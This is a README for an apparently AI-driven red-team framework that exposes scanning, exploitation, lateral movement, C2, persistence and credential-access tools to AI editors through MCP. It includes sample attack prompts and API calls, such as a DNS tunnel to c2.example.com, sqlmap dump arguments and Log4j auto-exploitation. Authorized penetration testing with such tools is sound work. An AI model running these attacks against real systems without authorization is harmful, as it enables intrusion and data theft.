<p align="center">
  <img src="https://raw.githubusercontent.com/Coff0xc/AutoRedTeam-Orchestrator/main/assets/banner.png" alt="AutoRedTeam-Orchestrator" width="800">
</p>

<h1 align="center">AutoRedTeam-Orchestrator</h1>

<p align="center">
  <b>AI-Driven Automated Red Team Orchestration Framework</b><br>
  <sub>Cross-platform | 100+ MCP Tools | 2000+ Payloads | Full ATT&CK Coverage</sub>
</p>

<p align="center">
  <a href="README.md">简体中文</a> ·
  <a href="README_EN.md"><b>English</b></a> ·
  <a href="README_JA.md">日本語</a> ·
  <a href="README_RU.md">Русский</a> ·
  <a href="README_DE.md">Deutsch</a> ·
  <a href="README_FR.md">Français</a>
</p>

<p align="center">
  <a href="https://github.com/Coff0xc/AutoRedTeam-Orchestrator/stargazers"><img src="https://img.shields.io/github/stars/Coff0xc/AutoRedTeam-Orchestrator?style=flat-square&logo=github&color=gold" alt="Stars"></a>
  <a href="https://github.com/Coff0xc/AutoRedTeam-Orchestrator/network/members"><img src="https://img.shields.io/github/forks/Coff0xc/AutoRedTeam-Orchestrator?style=flat-square&logo=github&color=silver" alt="Forks"></a>
  <a href="https://github.com/Coff0xc/AutoRedTeam-Orchestrator/issues"><img src="https://img.shields.io/github/issues/Coff0xc/AutoRedTeam-Orchestrator?style=flat-square&logo=github&color=red" alt="Issues"></a>
  <a href="https://github.com/Coff0xc/AutoRedTeam-Orchestrator/commits/main"><img src="https://img.shields.io/github/last-commit/Coff0xc/AutoRedTeam-Orchestrator?style=flat-square&logo=github" alt="Last Commit"></a>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Version-3.0.1-blue?style=flat-square" alt="Version">
  <img src="https://img.shields.io/badge/Python-3.10+-3776AB?style=flat-square&logo=python&logoColor=white" alt="Python">
  <img src="https://img.shields.io/badge/MCP-Native-00ADD8?style=flat-square" alt="MCP">
  <img src="https://img.shields.io/badge/Tools-100+-FF6B6B?style=flat-square" alt="Tools">
  <img src="https://img.shields.io/badge/License-MIT-green?style=flat-square" alt="License">
</p>

<p align="center">
  <a href="https://discord.gg/PtVyrMvB"><img src="https://img.shields.io/badge/Discord-Community-5865F2?style=flat-square&logo=discord&logoColor=white" alt="Discord"></a>
  <a href="https://github.com/Coff0xc/AutoRedTeam-Orchestrator/wiki"><img src="https://img.shields.io/badge/Wiki-Docs-blue?style=flat-square&logo=gitbook&logoColor=white" alt="Wiki"></a>
</p>

---

## Table of Contents

- [Overview](#overview)
- [Core Features](#core-features)
- [ATT&CK Coverage Matrix](#attck-coverage-matrix)
- [Quick Start](#quick-start)
  - [System Requirements](#system-requirements)
  - [Installation](#installation)
  - [Verify Installation](#verify-installation)
- [MCP Configuration](#mcp-configuration)
- [Tool Matrix](#tool-matrix-100-mcp-tools)
- [External Tool Integration](#external-tool-integration)
- [Usage Examples](#usage-examples)
  - [Natural Language Commands](#natural-language-commands)
  - [Python API](#python-api)
- [Architecture](#architecture)
- [Configuration](#configuration)
- [Performance Tuning](#performance-tuning)
- [Troubleshooting](#troubleshooting)
- [FAQ](#faq)
- [Changelog](#changelog)
- [Roadmap](#roadmap)
- [Contributing](#contributing)
- [Security Policy](#security-policy)
- [Acknowledgments](#acknowledgments)
- [License](#license)
- [Disclaimer](#disclaimer)

---

## Overview

**AutoRedTeam-Orchestrator** is an AI-driven automated penetration testing framework built on the [Model Context Protocol (MCP)](https://modelcontextprotocol.io/). It wraps 100+ security tools as MCP tools, enabling seamless integration with MCP-compatible AI editors (Cursor, Windsurf, Kiro, Claude Desktop) for natural language-driven security testing.

### Why AutoRedTeam-Orchestrator?

| Feature | Traditional Tools | AutoRedTeam |
|---------|-------------------|-------------|
| **Interaction** | CLI memorization | Natural language chat |
| **Learning Curve** | High (many parameters) | Low (AI selects tools) |
| **Tool Integration** | Manual switching | 100+ tools unified |
| **Attack Planning** | Manual | AI recommendations |
| **Reporting** | Manual writing | One-click professional reports |
| **Session Management** | None | Checkpoint/resume support |

---

## Core Features

<table>
<tr>
<td width="50%">

**AI-Native Design**
- **Smart Fingerprinting** - Auto-detect target tech stack (CMS/frameworks/WAF)
- **Attack Chain Planning** - AI-driven attack path recommendations
- **Historical Feedback Learning** - Continuous strategy optimization
- **Auto Payload Selection** - WAF-aware intelligent mutation
- **AI PoC Generation** - Generate exploit code from CVE descriptions

</td>
<td width="50%">

**Full Automation**
- **10-Phase Recon Pipeline** - DNS/Port/Fingerprint/WAF/Subdomain/Directory/JS analysis
- **Vulnerability Discovery & Verification** - Auto scan + OOB validation
- **Smart Exploitation Orchestration** - Feedback loop + auto retry
- **One-Click Professional Reports** - JSON/HTML/Markdown formats
- **Session Checkpoint Recovery** - Resume interrupted scans

</td>
</tr>
<tr>
<td width="50%">

**Red Team Toolkit**
- **Lateral Movement** - SMB/SSH/WMI/WinRM/PSExec (5 protocols)
- **C2 Communication** - Beacon + DNS/HTTP/WebSocket/ICMP tunnels
- **Evasion & Obfuscation** - XOR/AES/Base64/custom encoders
- **Persistence** - Windows Registry/Scheduled Tasks/WMI/Linux cron/Webshell
- **Credential Access** - Memory extraction/File search/Password spray
- **AD Attacks** - Kerberoasting/AS-REP Roasting/SPN scan

</td>
<td width="50%">

**Security Extensions**
- **API Security** - JWT/CORS/GraphQL/WebSocket/OAuth testing
- **Supply Chain Security** - SBOM generation/Dependency audit/CI-CD scan
- **Cloud Native Security** - K8s RBAC/Pod security/gRPC/AWS audit
- **CVE Intelligence** - NVD/Nuclei/ExploitDB multi-source sync
- **WAF Bypass** - 2000+ payloads + 30+ encoding methods

</td>
</tr>
</table>

---

## ATT&CK Coverage Matrix

| Tactic | Techniques Covered | Tool Count | Status |
|--------|-------------------|------------|--------|
| Reconnaissance | Active Scanning, Passive Collection, OSINT, JS Analysis | 12+ | ✅ |
| Resource Development | Payload Generation, Obfuscation, PoC Generation | 4+ | ✅ |
| Initial Access | Web Exploitation, CVE Exploits, API Vulnerabilities | 19+ | ✅ |
| Execution | Command Injection, Code Execution, Deserialization | 5+ | ✅ |
| Persistence | Registry, Scheduled Tasks, Webshell, WMI | 3+ | ✅ |
| Privilege Escalation | UAC Bypass, Token Impersonation, Kernel Exploits | 2+ | ⚠️ |
| Defense Evasion | AMSI Bypass, ETW Bypass, Obfuscation, Traffic Mutation | 4+ | ✅ |
| Credential Access | Memory Extraction, File Search, Password Spray | 2+ | ✅ |
| Discovery | Network Scanning, Service Enumeration, AD Enumeration | 8+ | ✅ |
| Lateral Movement | SMB/SSH/WMI/WinRM/PSExec | 9+ | ✅ |
| Collection | Data Aggregation, Sensitive File Search | 2+ | ✅ |
| Command & Control | HTTP/DNS/WebSocket/ICMP Tunnels | 4+ | ✅ |
| Exfiltration | DNS/HTTP/ICMP/SMB + AES Encryption | 4+ | ✅ |

---

## Quick Start

### System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| OS | Windows 10, Ubuntu 20.04, macOS 12 | Windows 11, Ubuntu 22.04, macOS 14 |
| Python | 3.10 | 3.11 or 3.12 |
| Memory | 4GB | 8GB+ |
| Disk | 500MB | 2GB+ (with CVE database) |
| Network | Internet access | Low latency |

### Installation

#### Option 1: Standard Installation (Recommended)

```bash
# 1. Clone repository
git clone https://github.com/Coff0xc/AutoRedTeam-Orchestrator.git
cd AutoRedTeam-Orchestrator

# 2. Create virtual environment (recommended)
python -m venv venv
# Linux/macOS:
source venv/bin/activate
# Windows:
venv\Scripts\activate

# 3. Install dependencies
pip install -r requirements.txt

# 4. Copy environment template
cp .env.example .env
# Edit .env with your API keys

# 5. Start service
python mcp_stdio_server.py
```

#### Option 2: Minimal Installation (Core only)

```bash
# Install core dependencies only (Recon + Vuln Detection)
pip install -r requirements-core.txt
```

#### Option 3: Docker Deployment

```bash
docker pull coff0xc/autoredteam:latest
docker run -it --rm \
  -v $(pwd)/config:/app/config \
  -v $(pwd)/data:/app/data \
  coff0xc/autoredteam
```

#### Option 4: Development Environment

```bash
# Install dev dependencies (testing, formatting, linting)
pip install -r requirements-dev.txt

# Install pre-commit hooks
pre-commit install
```

### Verify Installation

```bash
# Check version
python mcp_stdio_server.py --version
# Output: AutoRedTeam-Orchestrator v3.0.1

# Run self-check
python -c "from core import __version__; print(f'Core version: {__version__}')"

# Run tests (dev environment)
pytest tests/ -v --tb=short
```

---

## MCP Configuration

Add the following configuration to your AI editor's MCP config file:

### Config File Locations

| Editor | Config Path |
|--------|-------------|
| Cursor | `~/.cursor/mcp.json` |
| Windsurf | `~/.codeium/windsurf/mcp_config.json` |
| Kiro | `~/.kiro/mcp.json` |
| Claude Desktop | `~/Library/Application Support/Claude/claude_desktop_config.json` (macOS) |
| VS Code (MCP Extension) | `.vscode/mcp.json` |

### Configuration Examples

<details>
<summary><b>Cursor</b> - <code>~/.cursor/mcp.json</code></summary>

```json
{
  "mcpServers": {
    "redteam": {
      "command": "python",
      "args": ["/absolute/path/to/AutoRedTeam-Orchestrator/mcp_stdio_server.py"],
      "env": {
        "PYTHONIOENCODING": "utf-8"
      }
    }
  }
}
```

</details>

<details>
<summary><b>Windsurf</b> - <code>~/.codeium/windsurf/mcp_config.json</code></summary>

```json
{
  "mcpServers": {
    "redteam": {
      "command": "python",
      "args": ["/absolute/path/to/AutoRedTeam-Orchestrator/mcp_stdio_server.py"],
      "env": {
        "PYTHONIOENCODING": "utf-8",
        "PYTHONPATH": "/absolute/path/to/AutoRedTeam-Orchestrator"
      }
    }
  }
}
```

</details>

<details>
<summary><b>Kiro</b> - <code>~/.kiro/mcp.json</code></summary>

```json
{
  "mcpServers": {
    "redteam": {
      "command": "python",
      "args": ["/absolute/path/to/AutoRedTeam-Orchestrator/mcp_stdio_server.py"]
    }
  }
}
```

</details>

<details>
<summary><b>Claude Desktop</b></summary>

```json
{
  "mcpServers": {
    "redteam": {
      "command": "python",
      "args": ["/absolute/path/to/AutoRedTeam-Orchestrator/mcp_stdio_server.py"],
      "env": {
        "PYTHONIOENCODING": "utf-8"
      }
    }
  }
}
```

</details>

<details>
<summary><b>Windows Path Example</b></summary>

```json
{
  "mcpServers": {
    "redteam": {
      "command": "python",
      "args": ["C:\\Users\\YourName\\AutoRedTeam-Orchestrator\\mcp_stdio_server.py"],
      "env": {
        "PYTHONIOENCODING": "utf-8"
      }
    }
  }
}
```

</details>

---

## Tool Matrix (100+ MCP Tools)

| Category | Count | Key Tools | Description |
|----------|-------|-----------|-------------|
| **Recon** | 8 | `port_scan` `subdomain_enum` `fingerprint` `waf_detect` `js_analyze` `dir_scan` `dns_lookup` `tech_detect` | Information gathering & asset discovery |
| **Vuln Detection** | 11 | `sqli_scan` `xss_scan` `ssrf_scan` `rce_scan` `ssti_scan` `xxe_scan` `idor_scan` `path_traversal_scan` `cors_scan` `security_headers_scan` | OWASP Top 10 + Logic flaws |
| **API Security** | 7 | `jwt_scan` `graphql_scan` `websocket_scan` `oauth_scan` `cors_deep_scan` `security_headers_score` | Modern API security testing |
| **Supply Chain** | 3 | `sbom_generate` `dependency_audit` `cicd_scan` | SBOM/Dependency/CI-CD security |
| **Cloud Native** | 3 | `k8s_scan` `grpc_scan` `aws_scan` | K8s/gRPC/AWS security audit |
| **Red Team Core** | 14 | `lateral_smb` `c2_beacon_start` `credential_find` `privilege_escalate` `payload_obfuscate` | Post-exploitation & internal |
| **Lateral Movement** | 9 | `lateral_ssh` `lateral_wmi` `lateral_winrm` `lateral_psexec` `lateral_ssh_tunnel` | 5-protocol lateral |
| **Persistence** | 3 | `persistence_windows` `persistence_linux` `persistence_webshell` | Windows/Linux/Web |
| **AD Attacks** | 3 | `ad_enumerate` `ad_kerberos_attack` `ad_spn_scan` | Full domain pentest |
| **CVE** | 8 | `cve_search` `cve_sync` `cve_stats` `poc_execute` `poc_list` `cve_auto_exploit` `cve_exploit_with_desc` `cve_generate_poc` | CVE intel + AI PoC |
| **Orchestration** | 11 | `auto_pentest` `pentest_resume` `pentest_status` `pentest_phase` `smart_analyze` `attack_chain_plan` | Automated pentesting |
| **External Tools** | 8 | `ext_nmap_scan` `ext_nuclei_scan` `ext_sqlmap_scan` `ext_ffuf_fuzz` `ext_masscan_scan` `ext_tool_chain` `ext_tools_status` | Professional tool integration |
| **AI Assisted** | 3 | `smart_payload` `ai_attack_chain` `smart_pentest` | Intelligent analysis |
| **Session/Reports** | 9 | `session_create` `session_status` `session_list` `session_complete` `generate_report` `export_findings` | Session management + reporting |

---

## External Tool Integration

Support for integrating locally installed professional security tools:

| Tool | Purpose | MCP Command | Requirements |
|------|---------|-------------|--------------|
| **Nmap** | Port scanning + Service detection + NSE scripts | `ext_nmap_scan` | System PATH or configured path |
| **Nuclei** | 7000+ CVE/vulnerability template scanning | `ext_nuclei_scan` | Go binary |
| **SQLMap** | 6 SQL injection techniques + WAF bypass | `ext_sqlmap_scan` | Python script |
| **ffuf** | High-speed directory/parameter fuzzing | `ext_ffuf_fuzz` | Go binary |
| **Masscan** | Ultra-fast large-scale port scanning | `ext_masscan_scan` | Requires root/admin |

### Configure External Tools

Edit `config/external_tools.yaml`:

```yaml
# Base tools directory
base_path: "/path/to/your/security-tools"

tools:
  nmap:
    enabled: true
    path: "${base_path}/nmap/nmap"
    default_args:
      quick: ["-sT", "-T4", "--open"]
      full: ["-sT", "-sV", "-sC", "-T4", "--open"]
      vuln: ["-sV", "--script=vuln"]

  nuclei:
    enabled: true
    path: "${base_path}/nuclei/nuclei"
    templates_path: "${base_path}/nuclei-templates"
    default_args:
      quick: ["-silent", "-severity", "critical,high"]
      cve: ["-silent", "-tags", "cve"]

  sqlmap:
    enabled: true
    path: "${base_path}/sqlmap/sqlmap.py"
    python_script: true
    default_args:
      detect: ["--batch", "--level=2", "--risk=1"]
      exploit: ["--batch", "--level=5", "--risk=3", "--dump"]

  ffuf:
    enabled: true
    path: "${base_path}/ffuf/ffuf"
    default_args:
      dir: ["-t", "50", "-fc", "404"]

  masscan:
    enabled: true
    path: "${base_path}/masscan/masscan"
    requires_root: true

# Tool chain configuration
chains:
  full_recon:
    - name: "masscan"
      args: ["--rate=10000", "-p1-10000"]
    - name: "nmap"
      args: ["-sV", "-sC"]
      depends_on: "masscan"

  vuln_scan:
    - name: "nuclei"
      args: ["-severity", "critical,high,medium"]
    - name: "sqlmap"
      condition: "has_params"
```

### Tool Chain Orchestration

```bash
# Full recon chain: masscan quick discovery → nmap detailed identification
ext_tool_chain target="192.168.1.0/24" chain_name="full_recon"

# Vulnerability scan chain: nuclei + sqlmap combined detection
ext_tool_chain target="https://example.com" chain_name="vuln_scan"

# Check external tool status
ext_tools_status
```

---

## Usage Examples

### Natural Language Commands

Chat directly in AI editors to invoke tools:

#### Reconnaissance & Information Gathering

```
# Full reconnaissance
"Perform full reconnaissance on example.com and generate a report"

# Port scanning
"Scan open ports on 192.168.1.0/24 network"

# Subdomain enumeration
"Enumerate all subdomains for example.com"

# Fingerprinting
"Identify the tech stack and WAF of the target website"

# JS analysis
"Analyze JavaScript files on target site for sensitive information"
```

#### Vulnerability Scanning

```
# SQL injection
"Check if https://target.com/api?id=1 is vulnerable to SQL injection"

# XSS scanning
"Scan target forms for XSS vulnerabilities and generate PoC"

# API security
"Perform full JWT/CORS/GraphQL security testing on target API"

# CVE search and exploitation
"Search for Apache Log4j related CVEs and execute PoC"
```

#### Red Team Operations

```
# Lateral movement
"Execute whoami command on 192.168.1.100 via SMB"

# C2 communication
"Start DNS tunnel connection to c2.example.com"

# Persistence
"Establish scheduled task persistence on Windows target"

# AD attacks
"Perform Kerberoasting attack against domain controller"
```

#### Automated Penetration Testing

```
# Full auto pentest
"Run full automated penetration test on https://target.com with detailed report"

# Smart attack chain
"Analyze target and generate optimal attack chain recommendations"

# Resume session
"Resume previously interrupted penetration testing session"
```

### Python API

#### Basic Usage

```python
import asyncio
from core.recon import StandardReconEngine, ReconConfig
from core.detectors import DetectorFactory

async def main():
    # 1. Recon engine
    config = ReconConfig(
        quick_mode=False,
        enable_js_analysis=True,
        max_threads=50
    )
    engine = StandardReconEngine("https://target.com", config)
    recon_result = await engine.run()
    print(f"Found {len(recon_result.open_ports)} open ports")

    # 2. Vulnerability detection
    detector = DetectorFactory.create_composite(['sqli', 'xss', 'ssrf'])
    vuln_results = await detector.async_detect(
        url="https://target.com/api",
        params={'id': '1'}
    )

    for vuln in vuln_results:
        print(f"Vulnerability found: {vuln.type} - {vuln.severity}")

asyncio.run(main())
```

#### Lateral Movement

```python
from core.lateral import SMBLateralMove, SSHLateralMove

# SMB lateral
smb = SMBLateralMove(
    target="192.168.1.100",
    credential={"username": "admin", "password_hash": "aad3b435..."}
)
result = await smb.execute_command("whoami")

# SSH tunnel
ssh = SSHLateralMove(
    target="192.168.1.100",
    credential={"username": "root", "private_key_path": "/path/to/key"}
)
await ssh.create_tunnel(local_port=8080, remote_port=80)
```

#### CVE Auto-Exploitation

```python
from core.cve import CVEAutoExploit

exploit = CVEAutoExploit()

# Search and exploit
results = await exploit.search_and_exploit(
    cve_id="CVE-2021-44228",
    target="https://target.com"
)

# AI-generated PoC
poc_code = await exploit.generate_poc(
    cve_id="CVE-2024-12345",
    target_info={"os": "linux", "service": "nginx"}
)
```

#### Session Management

```python
from core.session import SessionManager

manager = SessionManager()

# Create session
session_id = await manager.create_session(
    target="https://target.com",
    scan_type="full_pentest"
)

# Resume session
await manager.resume_session(session_id)

# Export results
await manager.export_findings(session_id, format="html")
```

---

## Architecture

```
AutoRedTeam-Orchestrator/
├── mcp_stdio_server.py       # MCP Server Entry (100+ tools registered)
│
├── handlers/                 # MCP Tool Handlers (16 modules)
│   ├── recon_handlers.py           # Recon tools (8)
│   ├── detector_handlers.py        # Vuln detection tools (11)
│   ├── api_security_handlers.py    # API security tools (7)
│   ├── supply_chain_handlers.py    # Supply chain tools (3)
│   ├── cloud_security_handlers.py  # Cloud security tools (3)
│   ├── cve_handlers.py             # CVE tools (8)
│   ├── redteam_handlers.py         # Red team tools (14)
│   ├── lateral_handlers.py         # Lateral movement tools (9)
│   ├── persistence_handlers.py     # Persistence tools (3)
│   ├── ad_handlers.py              # AD attack tools (3)
│   ├── orchestration_handlers.py   # Orchestration tools (11)
│   ├── external_tools_handlers.py  # External tools (8)
│   ├── ai_handlers.py              # AI assisted tools (3)
│   ├── session_handlers.py         # Session tools (4)
│   ├── report_handlers.py          # Report tools (2)
│   └── misc_handlers.py            # Misc tools (3)
│
├── core/                     # Core Engines
│   ├── recon/               # Recon Engine (10-phase pipeline)
│   ├── detectors/           # Vulnerability Detectors
│   ├── cve/                 # CVE Intelligence
│   ├── c2/                  # C2 Communication Framework
│   ├── lateral/             # Lateral Movement
│   ├── evasion/             # Evasion & Obfuscation
│   ├── persistence/         # Persistence
│   ├── credential/          # Credential Access
│   ├── ad/                  # AD Attacks
│   ├── session/             # Session Management
│   ├── tools/               # External Tool Management
│   └── security/            # Security Components
│
├── modules/                  # Feature Modules
│   ├── api_security/        # API Security
│   ├── supply_chain/        # Supply Chain Security
│   ├── cloud_security/      # Cloud Security
│   └── payload/             # Payload Engine
│
├── utils/                    # Utility Functions
├── wordlists/                # Built-in Wordlists
├── config/                   # Configuration Files
├── tests/                    # Test Suite (1075 test cases)
└── docs/                     # Documentation
```

---

## Configuration

### Environment Variables (.env)

```bash
# ========== Security ==========
# Master key (auto-generated on first run)
REDTEAM_MASTER_KEY=

# MCP authorization key (optional)
AUTOREDTEAM_API_KEY=

# Auth mode: strict, permissive, disabled
AUTOREDTEAM_AUTH_MODE=permissive

# ========== API Keys ==========
# AI analysis
OPENAI_API_KEY=your_key
ANTHROPIC_API_KEY=your_key

# Reconnaissance
SHODAN_API_KEY=your_key
CENSYS_API_ID=your_id
CENSYS_API_SECRET=your_secret

# CVE intelligence
NVD_API_KEY=your_key
GITHUB_TOKEN=your_token

# ========== Proxy Settings ==========
HTTP_PROXY=
HTTPS_PROXY=
SOCKS_PROXY=

# ========== Global Config ==========
VERIFY_SSL=false
RATE_LIMIT_DELAY=0.3
MAX_THREADS=50
REQUEST_TIMEOUT=10

# ========== Logging ==========
LOG_LEVEL=INFO
LOG_FILE=logs/redteam.log
```

### pyproject.toml Optional Dependencies

```bash
# Install specific features only
pip install autoredteam-orchestrator[ai]        # AI features
pip install autoredteam-orchestrator[recon]     # Recon features
pip install autoredteam-orchestrator[network]   # Network features
pip install autoredteam-orchestrator[reporting] # Reporting
pip install autoredteam-orchestrator[dev]       # Dev dependencies
```

---

## Performance Tuning

### Concurrency Configuration

```yaml
# config/performance.yaml
concurrency:
  max_threads: 100          # Max threads
  max_async_tasks: 200      # Max async tasks
  connection_pool_size: 50  # Connection pool size

rate_limiting:
  requests_per_second: 50   # Requests per second
  burst_size: 100           # Burst size

timeouts:
  connect: 5                # Connect timeout (seconds)
  read: 30                  # Read timeout
  total: 120                # Total timeout
```

### Memory Optimization

```python
# Use streaming for large-scale scans
engine = StandardReconEngine(
    target="192.168.0.0/16",
    config=ReconConfig(
        streaming_mode=True,    # Enable streaming
        batch_size=1000,        # Batch size
        memory_limit="2GB"      # Memory limit
    )
)
```

### Distributed Scanning

```python
# Use Celery distributed task queue
from core.distributed import DistributedScanner

scanner = DistributedScanner(
    broker="redis://localhost:6379",
    workers=10
)
await scanner.scan_targets(["192.168.1.0/24", "192.168.2.0/24"])
```

---

## Troubleshooting

### Common Issues

| Issue | Cause | Solution |
|-------|-------|----------|
| MCP server won't connect | Path error or Python env issue | Check absolute path in config, verify Python interpreter |
| Import errors | PYTHONPATH not set | Add `PYTHONPATH` env variable to config |
| External tool call fails | Tool not installed or path error | Run `ext_tools_status` to check tool status |
| CVE sync fails | Network issue or API rate limit | Check network, configure NVD_API_KEY |
| Slow scanning | Low concurrency config | Adjust `MAX_THREADS` and `RATE_LIMIT_DELAY` |
| Out of memory | Large-scale scan | Enable `streaming_mode`, set `memory_limit` |

### Debug Mode

```bash
# Enable verbose logging
LOG_LEVEL=DEBUG python mcp_stdio_server.py

# Check for syntax errors
python -m py_compile mcp_stdio_server.py

# Run single test
pytest tests/test_recon.py::test_port_scan -v
```

### Log Analysis

```bash
# View recent errors
tail -f logs/redteam.log | grep ERROR

# Analyze performance bottlenecks
grep "elapsed" logs/redteam.log | sort -t: -k4 -n
```

---

## FAQ

<details>
<summary><b>Q: How to use in offline environments?</b></summary>

A:
1. Pre-download CVE database: `python core/cve/update_manager.py sync --offline-export`
2. Use local wordlist files
3. Disable network-dependent features: `OFFLINE_MODE=true`

</details>

<details>
<summary><b>Q: How to add custom detectors?</b></summary>

A:
1. Create new file in `core/detectors/`
2. Inherit `BaseDetector` class
3. Implement `detect()` and `async_detect()` methods
4. Register MCP tool in `handlers/detector_handlers.py`

```python
from core.detectors.base import BaseDetector

class CustomDetector(BaseDetector):
    async def async_detect(self, url, params):
        # Implement detection logic
        return VulnResult(...)
```

</details>

<details>
<summary><b>Q: How to integrate other external tools?</b></summary>

A:
1. Add tool config in `config/external_tools.yaml`
2. Add MCP tool function in `handlers/external_tools_handlers.py`
3. Use `core/tools/tool_manager.py`'s `execute_tool()` method

</details>

<details>
<summary><b>Q: How to handle WAF blocking?</b></summary>

A:
1. Use `smart_payload` tool for automatic WAF bypass payload selection
2. Configure proxy pool: `PROXY_POOL=true`
3. Enable traffic mutation: `traffic_mutation=true`
4. Reduce scan speed: `RATE_LIMIT_DELAY=1.0`

</details>

<details>
<summary><b>Q: What report formats are supported?</b></summary>

A:
- JSON (machine-readable)
- HTML (visual report with charts)
- Markdown (suitable for Git/Wiki)
- PDF (requires `reportlab`)
- DOCX (requires `python-docx`)

</details>

---

## Changelog

### v3.0.1 (2026-01-30) - Quality Hardening

**Added**
- CVE auto-exploit enhancement (`cve_auto_exploit`, `cve_exploit_with_desc`, `cve_generate_poc`)
- AI PoC generator (`core/cve/ai_poc_generator.py`)

**Fixed**
- Version sync - Unified VERSION/pyproject.toml/source code
- ToolCounter fix - Added external_tools/lateral/persistence/ad categories
- Test fixes - Updated outdated test case references
- Thread safety - Added threading.Lock to beacon.py state management

**Improved**
- CI/CD enforcement - Lint failures now block builds
- Test coverage threshold raised to 50%
- Dependency constraints - Added upper bounds

### v3.0.0 (2026-01-18) - Architecture Enhancement

**Added**
- External tool integration - 8 external tool MCP commands
- Tool chain orchestration - YAML-driven multi-tool combinations
- Handler modularization - 16 independent Handler modules

**Improved**
- MCP tools now at 100+
- Feedback loop engine - Smart exploitation orchestrator
- WAF bypass - Enhanced payload mutation engine

<details>
<summary><b>View more versions</b></summary>

### v2.8.0 (2026-01-15) - Security Hardening
- Enhanced input validation, unified exception handling, performance optimization

### v2.7.1 (2026-01-10) - Web Scanner Engine
- Web Scanner module, built-in wordlists

### v2.7.0 (2026-01-09) - Architecture Refactoring
- Modular refactoring, StandardReconEngine

### v2.6.0 (2026-01-07) - API/Supply Chain/Cloud Security
- JWT/CORS/GraphQL/WebSocket security testing
- SBOM generation, K8s/gRPC security audit

</details>

---

## Roadmap

### In Progress
- [ ] Web UI management interface
- [ ] Distributed scanning cluster

### Planned
- [ ] More cloud platforms (GCP/Alibaba Cloud/Tencent Cloud)
- [ ] Burp Suite plugin integration
- [ ] Mobile app security testing
- [ ] AI autonomous attack agent

### Completed
- [x] Full Red Team toolkit
- [x] CVE intelligence & AI PoC generation
- [x] API/Supply Chain/Cloud security modules
- [x] Fully automated penetration testing framework
- [x] External tool integration

---

## Contributing

We welcome all forms of contributions!

### Quick Start

```bash
# 1. Fork and clone
git clone https://github.com/YOUR_USERNAME/AutoRedTeam-Orchestrator.git
cd AutoRedTeam-Orchestrator

# 2. Create branch
git checkout -b feature/your-feature

# 3. Install dev dependencies
pip install -r requirements-dev.txt
pre-commit install

# 4. Develop and test
pytest tests/ -v

# 5. Submit PR
git push origin feature/your-feature
```

### Commit Convention

Use [Conventional Commits](https://www.conventionalcommits.org/) format:

- `feat:` New feature
- `fix:` Bug fix
- `docs:` Documentation
- `refactor:` Refactoring
- `test:` Testing
- `chore:` Build/tools

See [CONTRIBUTING.md](CONTRIBUTING.md) for details.

---

## Security Policy

- **Responsible Disclosure**: Report security vulnerabilities to [Coff0xc@protonmail.com](mailto:Coff0xc@protonmail.com)
- **Authorized Use Only**: This tool is for authorized security testing and research only
- **Compliance**: Ensure compliance with local laws before use

See [SECURITY.md](SECURITY.md) for details.

---

## Acknowledgments

- [Nuclei](https://github.com/projectdiscovery/nuclei) - Vulnerability scanner engine design
- [SQLMap](https://github.com/sqlmapproject/sqlmap) - SQL injection detection approach
- [Impacket](https://github.com/fortra/impacket) - Network protocol implementation
- [MCP Protocol](https://modelcontextprotocol.io/) - AI tool protocol standard

---

## License

This project is licensed under the **MIT License** - see [LICENSE](LICENSE) file for details.

---

## Disclaimer

> **WARNING**: This tool is for **authorized security testing and research only**.
>
> Before using this tool to test any system, ensure you have:
> - **Written authorization** from the system owner
> - Compliance with **local laws and regulations**
> - Adherence to **professional ethics** standards
>
> Unauthorized use may violate the law. **The developers are not responsible for any misuse**.

---

<p align="center">
  <b>Made with ❤️ by <a href="https://github.com/Coff0xc">Coff0xc</a></b>
</p>

<p align="center">
  <a href="https://discord.gg/PtVyrMvB">Discord</a> ·
  <a href="mailto:Coff0xc@protonmail.com">Email</a> ·
  <a href="https://github.com/Coff0xc/AutoRedTeam-Orchestrator/issues">Issues</a>
</p>
